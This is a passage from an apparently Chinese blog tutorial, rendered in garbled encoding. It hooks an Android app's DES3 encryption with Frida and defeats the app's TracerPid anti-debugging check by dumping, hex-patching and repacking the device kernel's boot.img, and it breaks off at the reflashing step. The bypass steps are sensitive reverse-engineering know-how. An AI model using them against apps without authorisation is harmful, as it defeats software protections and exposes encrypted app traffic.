data-src="/../images/app/TracerPID/5.png" data-caption="5"><img src="/../images/app/TracerPID/5.png" alt="5"></a></p><p>ç”±äºä¸ªäººä½¿ç”¨ä¹ æƒ¯ï¼Œè½¬è€Œåˆ©ç”¨ Jadx æ‰“å¼€ dex ç„¶ååˆ©ç”¨ Jadx è‡ªå¸¦çš„æ’ä»¶å¯¹è¯¥æ–¹æ³•ç”Ÿæˆ Frida Hook è„šæœ¬ã€‚å¯¹æ¯”ä¸¤å›¾å¯çŸ¥ï¼Œä¸åŒçš„è½¯ä»¶è¿›è¡Œåç¼–è¯‘ä»£ç ä¼šå­˜åœ¨ä¸€å®šçš„å·®å¼‚ï¼Œæ‰€ä»¥åœ¨è¿›è¡Œåç¼–è¯‘æ—¶ä¸å¦¨å¤šå°è¯•å‡ ä¸ªè½¯ä»¶ï¼Œå¯¹æ¯”ä¸€ä¸‹ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/6.png" data-caption="6"><img src="/../images/app/TracerPID/6.png" alt="6"></a></p><p>Jadx ä¸­é¼ æ ‡æ”¾ç½®åˆ°éœ€è¦è¿›è¡Œ Hook çš„æ–¹æ³•å¤„ï¼Œç„¶åå³é”®å¤åˆ¶ä¸º frida ä»£ç å³å¯å¾—åˆ°ä¸€ä¸ª js è„šæœ¬ï¼Œç¨ä½œä¿®é¥°å³å¯ç›´æ¥åˆ©ç”¨è¿›è¡Œ hookã€‚</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/7.png" data-caption="7"><img src="/../images/app/TracerPID/7.png" alt="7"></a></p><p>å¾—åˆ°çš„è„šæœ¬å¦‚ä¸‹ï¼š</p><div class="highlight-wrap" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> xxxDES3Util = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;cn.xxxx.encryption.xxxDES3Util&quot;</span>);</span><br><span class="line">xxxDES3Util[<span class="string">&quot;encode&quot;</span>].<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">str</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`xxxDES3Util.encode is called: str=<span class="subst">$&#123;str&#125;</span>`</span>);</span><br><span class="line">    <span class="keyword">let</span> result = <span class="variable language_">this</span>[<span class="string">&quot;encode&quot;</span>](str);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`xxxDES3Util.encode result=<span class="subst">$&#123;result&#125;</span>`</span>);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div><p>å®Œå–„åçš„å®Œæ•´ Hook è„šæœ¬å¦‚ä¸‹:</p><div class="highlight-wrap" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> xxxDES3Util = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;cn.xxxx.encryption.xxxDES3Util&quot;</span>);</span><br><span class="line">    xxxDES3Util[<span class="string">&quot;encode&quot;</span>].<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">str</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`xxxDES3Util.encode is called: str=<span class="subst">$&#123;str&#125;</span>`</span>);</span><br><span class="line">        <span class="keyword">let</span> result = <span class="variable language_">this</span>[<span class="string">&quot;encode&quot;</span>](str);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`xxxxDES3Util.encode result=<span class="subst">$&#123;result&#125;</span>`</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div><p>ç”µè„‘ ADB è¿æ¥æ‰‹æœºï¼Œæ‰‹æœºä¸Šå¯åŠ¨ frida serverï¼Œå°è¯•è¿›è¡Œ Hook æŸ¥çœ‹è¿”å›ç»“æœï¼Œå‡ºç°æŠ¥é”™å¦‚ä¸‹ï¼Œç¨‹åºè‡ªåŠ¨é€€å‡ºï¼Œç”±æŠ¥é”™ä¿¡æ¯å¯çŸ¥ï¼Œå¼•å‡ºé—®é¢˜ï¼Œå…³é”®åœ¨äºï¼š</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FATAL EXCEPTIONï¼šSafeGuardThread</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/8.png" data-caption="1"><img src="/../images/app/TracerPID/8.png" alt="1"></a></p><p>ç›´æ¥åœ¨åç¼–è¯‘ä¸­æœç´¢å…³é”®å­— <code>SafeGuardThread</code>ï¼Œç²—ç•¥æŸ¥çœ‹ä»£ç ï¼Œå¤§æ¦‚çŒœåˆ°æ˜¯ä¸€ä¸ªæ£€æµ‹æ‰‹æ®µï¼Œ å…³é”®ä¿¡æ¯åœ¨ <code>/proc/%d/status</code> ã€<code>TracerPid</code> æœç´¢å¼•æ“æœç´¢å…³é”®å­—å¾—çŸ¥è¯¥ä»£ç ä¸ºä¸€ä¸ªåè°ƒè¯•çš„æ‰‹æ®µï¼Œç½‘ä¸Šå­˜åœ¨ç›¸åŒä»£ç çš„è§£å†³æ–¹æ¡ˆã€‚</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/9.png" data-caption="9"><img src="/../images/app/TracerPID/9.png" alt="9"></a></p><p>æ•´åˆä¸Šé¢ä¿¡æ¯ï¼Œç”±äºè¯·æ±‚æ•°æ®åŠ å¯†ä¸”å­˜åœ¨ TracerPid åè°ƒè¯•æœºåˆ¶ï¼Œæƒ³è¦è¿›ä¸€æ­¥åˆ†æéœ€è¦è¿›è¡Œååè°ƒè¯•ï¼Œæƒ³è¦ç»•è¿‡æœºåˆ¶ï¼Œé¦–å…ˆå¾—äº†è§£å®ƒçš„å…·ä½“åè°ƒè¯•æ‰‹æ®µæ˜¯ä»€ä¹ˆã€‚é€šè¿‡ä¸€ç•ªæœç´¢ï¼Œå¾—çŸ¥ TracerPid åè°ƒè¯•æœºåˆ¶ä¸ºï¼š</p><ul><li><p>å½“è¿›ç¨‹æ­£å¸¸è¿è¡Œæ—¶,å®ƒçš„ TracerPID å€¼ä¸º 0,è¡¨ç¤ºæ²¡æœ‰è¢«è°ƒè¯•ã€‚</p></li><li><p>å½“è°ƒè¯•å™¨é™„åŠ åˆ°è¿›ç¨‹ä¸Šæ—¶,æ“ä½œç³»ç»Ÿä¼šä¸ºè¯¥è¿›ç¨‹è®¾ç½®ä¸€ä¸ªé 0 çš„ TracerPID å€¼,ç”¨æ¥æ ‡è¯†å½“å‰æ­£åœ¨è°ƒè¯•è¯¥è¿›ç¨‹ã€‚</p></li><li><p>TracerPID åè°ƒè¯•æœºåˆ¶ä¼šå®šæœŸæ£€æŸ¥è¿›ç¨‹çš„ TracerPID å€¼,å¦‚æœå‘ç°å®ƒä¸ä¸º 0,å°±åˆ¤æ–­è¯¥è¿›ç¨‹æ­£åœ¨è¢«è°ƒè¯•,ç„¶åé‡‡å–ç›¸åº”çš„åè°ƒè¯•æªæ–½,æ¯”å¦‚é€€å‡ºç¨‹åºæˆ–æŠ›å‡ºå¼‚å¸¸ç­‰ã€‚</p></li></ul><p>æ²¡æœ‰è¢«è°ƒè¯•çš„æ­£å¸¸è¿›ç¨‹ TracerPid å€¼ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/10.png" data-caption="10"><img src="/../images/app/TracerPID/10.png" alt="10"></a></p><p>å½“è°ƒè¯•å™¨é™„åŠ åˆ°è¿›ç¨‹ä¸Šæ—¶çš„ TracerPid å€¼ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/11.png" data-caption="11"><img src="/../images/app/TracerPID/11.png" alt="11"></a></p><h2 id="ä¸‰ã€ç»•è¿‡-TracerPid-æ£€æµ‹"><a href="#ä¸‰ã€ç»•è¿‡-TracerPid-æ£€æµ‹" class="headerlink" title="ä¸‰ã€ç»•è¿‡ TracerPid æ£€æµ‹"></a>ä¸‰ã€ç»•è¿‡ TracerPid æ£€æµ‹</h2><p>ç»•è¿‡ TracerPid æ£€æµ‹æœºåˆ¶å¸¸è§çš„æœ‰ä¸¤ç§æ‰‹æ®µï¼š<code>1ã€Hook å…³é”®ä»£ç ï¼Œä¿®æ”¹ TracerPid å€¼ä¸º 0ï¼Œç»•è¿‡æ£€æµ‹</code>ï¼›<code>2ã€ä¿®æ”¹ Android ç³»ç»Ÿå†…æ ¸ï¼Œä½¿ TracerPid å€¼é»˜è®¤ä¸º 0</code> ã€‚è¿™è¾¹ç›´æ¥é€‰ç”¨ç¬¬äºŒç§çš„æ–¹æ³•ï¼Œç›´æ¥ä¿®æ”¹ Android è®¾å¤‡ä¸­çš„ TracerPid å€¼ï¼Œä¸€åŠ³æ°¸é€¸ï¼Œå½“ä¸‹æ¬¡é‡åˆ°åŒæ ·çš„åè°ƒè¯•æ–¹æ¡ˆæ—¶ç›´æ¥åˆ©ç”¨è¯¥è®¾å¤‡æµ‹è¯•å³å¯ã€‚è¯¥ç»•è¿‡æ–¹æ³•çš„ä¸»è¦æ“ä½œæ­¥éª¤ä¸ºï¼š</p><ul><li>æå–æ‰‹æœºè®¾å¤‡çš„ boot.img(ç³»ç»Ÿé•œåƒæ–‡ä»¶)ã€‚</li><li>ä¿®æ”¹ boot.img ä¸­çš„ kerner(å†…æ ¸æ–‡ä»¶)ä¸­çš„ TracerPid å€¼ã€‚</li><li>åˆ·å…¥ä¿®æ”¹åçš„ boot.img æ–‡ä»¶ï¼Œä½¿ TracerPid å€¼é»˜è®¤ä¸º 0ã€‚</li></ul><h3 id="1ã€æå–-boot-img"><a href="#1ã€æå–-boot-img" class="headerlink" title="1ã€æå– boot.img"></a>1ã€æå– boot.img</h3><p>boot.img ä¸ºç³»ç»Ÿé•œåƒæ–‡ä»¶,åŒ…å«äº† Android è®¾å¤‡åœ¨å¯åŠ¨è¿‡ç¨‹ä¸­æ‰€éœ€çš„å…³é”®ç³»ç»Ÿç»„ä»¶,æ˜¯ç¡®ä¿è®¾å¤‡æ­£ç¡®å¯åŠ¨å’Œè¿è¡Œçš„åŸºç¡€ï¼Œå®ƒåŒ…å«äº†ä»¥ä¸‹å‡ ä¸ªä¸»è¦éƒ¨åˆ†ï¼š( æœ¬æ–‡è®¾å¤‡ä¸º å°ç±³ Mix 2s å·² root )</p><ul><li><p><strong>å†…æ ¸(Kernel)</strong>: Androidæ“ä½œç³»ç»Ÿçš„æ ¸å¿ƒéƒ¨åˆ†,è´Ÿè´£ç®¡ç†ç¡¬ä»¶èµ„æºã€é©±åŠ¨è®¾å¤‡ã€å†…å­˜ç®¡ç†ç­‰åŸºç¡€åŠŸèƒ½ã€‚</p></li><li><p><strong>åˆå§‹åŒ–ç³»ç»Ÿ(Init)</strong>: è´Ÿè´£åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶åˆå§‹åŒ–å„ç§æœåŠ¡å’Œè¿›ç¨‹,æ˜¯å¼•å¯¼ç³»ç»Ÿå¯åŠ¨çš„å…³é”®ç»„ä»¶ã€‚</p></li><li><p><strong>Recovery</strong>: ä¸€ä¸ªå¤‡ç”¨çš„æ“ä½œç³»ç»Ÿç¯å¢ƒ,ç”¨äºåœ¨è®¾å¤‡å‡ºç°é—®é¢˜æ—¶è¿›è¡Œç³»ç»Ÿä¿®å¤å’Œæ¢å¤ã€‚</p></li><li><p><strong>Ramdisk</strong>: ä¸€ä¸ªä¸´æ—¶çš„å†…å­˜æ–‡ä»¶ç³»ç»Ÿ,åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶ç”¨äºåŠ è½½å¿…è¦çš„é©±åŠ¨å’Œé…ç½®æ–‡ä»¶ã€‚</p></li></ul><p>1ã€é¦–å…ˆéœ€è¦åˆ©ç”¨å…·æœ‰ä¼ è¾“æ•°æ®çš„æ•°æ®çº¿è¿æ¥æ‰‹æœºè®¾å¤‡ï¼Œç„¶åç”µè„‘åˆ©ç”¨ <a href="https://developer.android.google.cn/tools/releases/platform-tools?hl=zh-cn#downloads">adb</a> è¿æ¥è®¾å¤‡ï¼Œé€šå¸¸ <code>boot.img</code> ä½äºæ‰‹æœºè®¾å¤‡çš„ <code>/dev/block/platform/soc/xxx/by-name</code> ,å…¶ä¸­ <code>xxx</code> ä¸º <code>soc</code> ç›®å½•ä¸‹çš„ä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œæ¯å°è®¾å¤‡çš„æ–‡ä»¶å¤¹åç§°ä¸ä¸€è‡´ï¼Œå…·ä½“åç§°è‡ªè¡ŒæŸ¥çœ‹å³å¯ï¼Œæ“ä½œå‘½ä»¤å¦‚ä¸‹ï¼š</p><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">adb è¿æ¥è®¾å¤‡</span></span><br><span class="line">D:\app\platform-tools&gt;adb.exe shell</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">root æƒé™è¿›è¡Œ boot.img ç›®å½•</span></span><br><span class="line">polaris:/ $ su</span><br><span class="line">polaris:/ # cd /dev/block/platform/soc/</span><br><span class="line">polaris:/dev/block/platform/soc # ls</span><br><span class="line">1d84000.ufshc</span><br><span class="line">polaris:/dev/block/platform/soc # cd 1d84000.ufshc/</span><br><span class="line">polaris:/dev/block/platform/soc/1d84000.ufshc # ls</span><br><span class="line">polaris:/dev/block/platform/soc/1d84000.ufshc # cd by-name/</span><br><span class="line">polaris:/dev/block/platform/soc/1d84000.ufshc/by-name # ls</span><br></pre></td></tr></table></figure></div><p>æ ¹æ®ä¸Šé¢å‘½ä»¤å¯çŸ¥ boot.img ä½äº by-name ç›®å½•ä¸‹ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/12.png" data-caption="12"><img src="/../images/app/TracerPID/12.png" alt="12"></a></p><p>é€šè¿‡ ls -al å‘½ä»¤å¯ä»¥æŸ¥çœ‹åˆ° boot.img æ–‡ä»¶çš„å­˜å‚¨åˆ†åŒºä½ç½®ä¸º <code>/dev/block/sde45</code>ã€‚</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">polaris:/dev/block/platform/soc/1d84000.ufshc/by-name # ls -al</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/13.png" data-caption="13"><img src="/../images/app/TracerPID/13.png" alt="13"></a></p><p>2ã€åˆ©ç”¨ dd ï¼ˆData Duplicator æ•°æ®å¤åˆ¶å™¨ï¼‰å‘½ä»¤ï¼Œå°† &#x2F;dev&#x2F;block&#x2F;sde45 ä¸­çš„ boot.img å¤åˆ¶åˆ° &#x2F;data&#x2F;local&#x2F;tmp ç›®å½•å¤„ï¼ŒåŸå› æ˜¯é¿å…è®¾å¤‡æƒé™é—®é¢˜æ— æ³•ç›´æ¥åˆ©ç”¨ adb  pull è¯¥æ–‡ä»¶è‡³ç”µè„‘å¤„ï¼Œå¤åˆ¶è‡³ &#x2F;data&#x2F;local&#x2F;tmp å¤„æ™®é€šæƒé™äº¦èƒ½ pullã€‚</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=/dev/block/sde45 of=/data/local/tmp/boot.img</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/14.png" data-caption="14"><img src="/../images/app/TracerPID/14.png" alt="14"></a></p><p>åˆ©ç”¨ adb pull boot.imgè‡³ç”µè„‘ã€‚</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb pull /data/local/tmp/boot.img D:\app\platform-tools</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/15.png" data-caption="15"><img src="/../images/app/TracerPID/15.png" alt="15"></a></p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/16.png" data-caption="16"><img src="/../images/app/TracerPID/16.png" alt="16"></a></p><h3 id="2ã€ä¿®æ”¹å†…æ ¸æ–‡ä»¶"><a href="#2ã€ä¿®æ”¹å†…æ ¸æ–‡ä»¶" class="headerlink" title="2ã€ä¿®æ”¹å†…æ ¸æ–‡ä»¶"></a>2ã€ä¿®æ”¹å†…æ ¸æ–‡ä»¶</h3><p>éœ€è¦ç”¨åˆ° Android_boot_image_editor è¿›è¡Œä¿®æ”¹ï¼Œä¸‹è½½åœ°å€ï¼š<a href="https://github.com/cfig/Android_boot_image_editor%EF%BC%8C%E7%AC%94%E8%80%85%E5%88%A9%E7%94%A8%E7%9A%84%E6%98%AF">https://github.com/cfig/Android_boot_image_editorï¼Œç¬”è€…åˆ©ç”¨çš„æ˜¯</a> Ubuntuã€‚</p><p>1ï¼‰ä¸‹è½½å·¥å…·</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/cfig/Android_boot_image_editor.git</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/17.png" data-caption="17"><img src="/../images/app/TracerPID/17.png" alt="17"></a></p><p>2ï¼‰å°†åˆšæ‰ä» Android è®¾å¤‡ä¸­ pull å‡ºæ¥çš„ boot.img ä¸Šä¼ è‡³ ubuntu çš„ Android_boot_image_editor å·¥å…·å¤„</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/18.png" data-caption="18"><img src="/../images/app/TracerPID/18.png" alt="18"></a></p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/19.png" data-caption="19"><img src="/../images/app/TracerPID/19.png" alt="19"></a></p><p>3ï¼‰åˆ©ç”¨ Android_boot_image_editor è§£å‹ boot.imgï¼Œæ‰§è¡Œå‘½ä»¤åä¼šä¸‹è½½ä¸€ä¸‹ä¾èµ–ï¼Œç­‰å¾…ä¸€ä¼šå³å¯</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./gradlew unpack</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/20.png" data-caption="20"><img src="/../images/app/TracerPID/20.png" alt="20"></a></p><p>å‡ºç° BUILD SUCCESSFUL è§£åŒ…å®Œæˆ</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/21.png" data-caption="21"><img src="/../images/app/TracerPID/21.png" alt="21"></a></p><p>è§£åŒ…å®Œçš„æ–‡ä»¶åœ¨ build&#x2F;unzip_boot ç›®å½•ä¸‹</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/22.png" data-caption="22"><img src="/../images/app/TracerPID/22.png" alt="22"></a></p><p>4ï¼‰ä¿®æ”¹ build&#x2F;unzip_boot æ–‡ä»¶å¤¹ä¸­çš„ kernel æ–‡ä»¶ï¼Œæˆ‘ä»¬éœ€è¦çš„æ“ä½œå°±æ˜¯è§£å¼€ kernel æ–‡ä»¶ï¼Œç„¶åä¿®æ”¹éƒ¨åˆ†å‚æ•°ï¼Œå®ç° TracerPid å€¼é»˜è®¤ä¸º0ï¼Œä»è€Œå®ç°ç»•è¿‡æ£€æµ‹ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå…ˆåˆ©ç”¨ binwalk åˆ†æä¸€ä¸‹ kernel æ–‡ä»¶ï¼Œå­˜åœ¨ä¸€ä¸ª gzip æ–‡ä»¶ï¼Œgzip ä¸‹é¢æ˜¯è®¾å¤‡æ–‡ä»¶ï¼Œå…¶ä¸­ 0x0 ä¸‹é¢ç¬¬ä¸€ä¸ª HEXDECIMAL ç­‰ä¸€ä¸‹éœ€è¦ç”¨åˆ°</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk kernel</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/23.png" data-caption="23"><img src="/../images/app/TracerPID/23.png" alt="23"></a></p><p>5ï¼‰ç°åœ¨æˆ‘ä»¬éœ€è¦æå–å‡ºå¤´éƒ¨çš„ gzipï¼Œè§£å‹ä¿®æ”¹åæ‹¼æ¥å›å»ï¼Œè¿™è¾¹åˆ©ç”¨ç½‘ä¸Šç°æœ‰çš„ python è„šæœ¬è¿›è¡Œæå–,å…¶ä¸­ 0xD3FD68 æ ¹æ®è‡ªå·±çš„ kernel æ–‡ä»¶åˆ©ç”¨ binwalk æŸ¥è¯¢åè‡ªè¡Œè¿›è¡Œæ›¿æ¢</p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./kernel&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">content=f.read(<span class="number">0xD3FD68</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./kernel_core.gz&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(content)</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/24.png" data-caption="24"><img src="/../images/app/TracerPID/24.png" alt="24"></a></p><p>æ‰§è¡Œå®Œ py è„šæœ¬åå¾—åˆ° kernel_core.gz æ–‡ä»¶</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/25.png" data-caption="25"><img src="/../images/app/TracerPID/25.png" alt="25"></a></p><p>å°† kernel_core.gz  æ–‡ä»¶å¤åˆ¶å‡ºæ¥ windows ä¸Šç„¶åè¿›è¡Œè§£å‹ï¼Œåˆ©ç”¨  010 Editor è¿›è¡Œä¿®æ”¹ï¼Œä¸‹è½½åœ°å€ï¼š<a href="https://www.sweetscape.com/010editor/%EF%BC%8C%E7%9B%B4%E6%8E%A5">https://www.sweetscape.com/010editor/ï¼Œç›´æ¥</a> Ctrl + F æœç´¢ Text ç±»å‹ï¼šTracerPid</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/26.png" data-caption="26"><img src="/../images/app/TracerPID/26.png" alt="26"></a></p><p>é¼ æ ‡æ”¾ç½® 00 00 å³å®šä½åˆ° TracerPid ä¸­çš„ç¬¬äºŒä¸ª <code>.</code>  å¤„ï¼Œä¿®æ”¹ä¸º 30 09ï¼Œä¿®æ”¹åï¼Œç‚¹å‡»ä¿å­˜ctrl+sï¼Œè‹¥ä¸æ”¾å¿ƒå¯ä¿å­˜é€€å‡ºåé‡æ–°åˆ©ç”¨ 010 editor æ‰“å¼€æŸ¥çœ‹æ˜¯å¦å·²ç»ä¿®æ”¹</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/27.png" data-caption="27"><img src="/../images/app/TracerPID/27.png" alt="27"></a></p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/28.png" data-caption="28"><img src="/../images/app/TracerPID/28.png" alt="28"></a></p><p>6ï¼‰å°† kernel_core é‡å‘½åä¸º kernelï¼Œç„¶åæ‹·è´å› Android_boot_image_editor ç›®å½•ä¸‹è¿›è¡Œå‹ç¼©</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gzip -n -f -9 kernel</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/29.png" data-caption="29"><img src="/../images/app/TracerPID/29.png" alt="29"></a></p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/30.png" data-caption="30"><img src="/../images/app/TracerPID/30.png" alt="30"></a></p><p>7ï¼‰ç§»åŠ¨åˆ° Android_boot_image_editor-master&#x2F;build&#x2F;unzip_boot ç›®å½•ä¸‹</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/31.png" data-caption="31"><img src="/../images/app/TracerPID/31.png" alt="31"></a></p><p>ç„¶ååˆ©ç”¨è„šæœ¬å¯¹åŸ kernel è¿›è¡Œæ‹¼æ¥(æ³¨æ„è„šæœ¬ä¸­çš„ f.seek()å‚æ•°å€¼ä¸ºæ­¤å‰åˆ©ç”¨ binwalk æŸ¥è¯¢åˆ°çš„å€¼)</p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./kernel.gz&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">content=f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./kernel&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.seek(<span class="number">0xD3FD68</span>)</span><br><span class="line">    content += f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./kernel_new&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(content)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/32.png" data-caption="32"><img src="/../images/app/TracerPID/32.png" alt="32"></a></p><p>æ‰§è¡Œå®Œè„šæœ¬åï¼Œè¯¥ç›®å½•ä¼šå‡ºç°ä¸€ä¸ªåä¸º kernel_new çš„æ–°æ–‡ä»¶</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/33.png" data-caption="33"><img src="/../images/app/TracerPID/33.png" alt="33"></a></p><p>8ï¼‰åˆ é™¤åŸ kernel æ–‡ä»¶ï¼Œå¹¶å°† kernel_new ä¿®æ”¹ä¸º kernelï¼Œå¹¶åˆ é™¤å¤šä½™æ–‡ä»¶ï¼Œå¯å¯¹æ¯”ä¹‹å‰è§£å‹çš„</p><p>åŸå§‹è§£å‹æ–‡ä»¶</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/34.png" data-caption="34"><img src="/../images/app/TracerPID/34.png" alt="34"></a></p><p>å°†åŸ kernel åˆ é™¤åï¼Œå°† kernel_newé‡å‘½åä¸º kernel å¹¶åˆ é™¤å¤šä½™æ–‡ä»¶å</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/35.png" data-caption="35"><img src="/../images/app/TracerPID/35.png" alt="35"></a></p><p>9ï¼‰æœ€åå›åˆ° Android_boot_image_editor æ ¹ç›®å½•ä¸‹ï¼Œæ‰§è¡Œå‘½ä»¤é‡æ–°æ‰“åŒ…</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./gradlew pack</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/36.png" data-caption="36"><img src="/../images/app/TracerPID/36.png" alt="36"></a></p><p>boot.img.signed ä¸ºé‡æ‰“åŒ…åçš„æ–‡ä»¶ï¼Œå³æˆ‘ä»¬ä¿®æ”¹ TracerPid å€¼åéœ€è¦é‡æ–°åˆ·å›æ‰‹æœºçš„ boot.img æ–‡ä»¶</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/37.png" data-caption="37"><img src="/../images/app/TracerPID/37.png" alt="37"></a></p><h3 id="3ã€åˆ·å…¥æ–°çš„-boot-img"><a href="#3ã€åˆ·å…¥æ–°çš„-boot-img" class="headerlink" title="3ã€åˆ·å…¥æ–°çš„ boot.img"></a>3ã€åˆ·å…¥æ–°çš„ boot.img</h3><p>åˆ·å…¥ boot.imgï¼Œ<strong>æ³¨æ„éœ€è¦å…ˆå°†æ—§çš„ boot.img ä»¥åŠä¿®æ”¹åçš„ boot.img 